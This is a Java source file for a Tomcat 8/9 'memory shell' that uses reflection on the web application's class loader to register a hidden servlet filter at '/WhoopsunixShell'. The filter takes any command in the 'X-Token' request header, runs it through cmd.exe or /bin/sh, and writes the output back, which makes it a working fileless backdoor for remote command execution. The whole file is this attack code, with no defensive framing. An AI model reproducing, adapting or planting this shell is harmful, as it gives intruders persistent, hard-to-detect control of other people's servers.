package com.demo.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * ContextClassLoader 注入 Tomcat Filter 型内存马
 * Tomcat 8 9
 */
public class TFMSContextClass implements Filter {

    final private static String NAME = "Whoopsunix";
    final private static String pattern = "/WhoopsunixShell";

    public TFMSContextClass() {

    }

    static {
        try {
            // 获取 standardContext
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.StandardContext standardContext;
            try {
                Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                getResourcesmethod.setAccessible(true);
                Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                getContextmethod.setAccessible(true);
                standardContext = (org.apache.catalina.core.StandardContext) getContextmethod.invoke(resources);
            } catch (Exception ignored) {
                Object root = getFieldValue(webappClassLoaderBase, "resources");
                standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
            }

            org.apache.tomcat.util.descriptor.web.FilterDef filterDef = standardContext.findFilterDef(NAME);
            if (filterDef == null) {
                TFMSContextClass filterMemShell = new TFMSContextClass();
//                // M1 ApplicationContext 方式注册
//                // 修改 state 状态
//                setFieldValue(standardContext, "state", org.apache.catalina.LifecycleState.STARTING_PREP);
//                FilterRegistration.Dynamic registration = standardContext.getServletContext().addFilter(NAME, filterMemShell);
//                registration.setInitParameter("encoding", "utf-8");
//                registration.setAsyncSupported(false);
//                // 已添加 filterMap
//                registration.addMappingForUrlPatterns(null, false, pattern);
//                setFieldValue(standardContext, "state", org.apache.catalina.LifecycleState.STARTED);
//
//                // 获取 filterDef，ApplicationContext.addFilter() 已调用
//                filterDef = standardContext.findFilterDef(NAME);


                // M2
                // 添加 filterDef
                filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
                filterDef.setFilterName(NAME);
                filterDef.setFilterClass(filterMemShell.getClass().getName());
                filterDef.setFilter(filterMemShell);
                standardContext.addFilterDef(filterDef);

                // 添加 filterMap
                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
                filterMap.setFilterName(NAME);
                filterMap.addURLPattern(pattern);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                standardContext.addFilterMapBefore(filterMap);

                // 添加 filterConfig
                java.util.Map filterConfigs = (java.util.Map) getFieldValue(standardContext, "filterConfigs");
                java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, org.apache.tomcat.util.descriptor.web.FilterDef.class);
                constructor.setAccessible(true);
                org.apache.catalina.core.ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                filterConfigs.put(NAME, filterConfig);
            }
        } catch (Exception e) {

        }
    }


    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println("TFMSContextClass injected");
            printWriter.println(result);
        } catch (Exception e) {

        }

    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

}
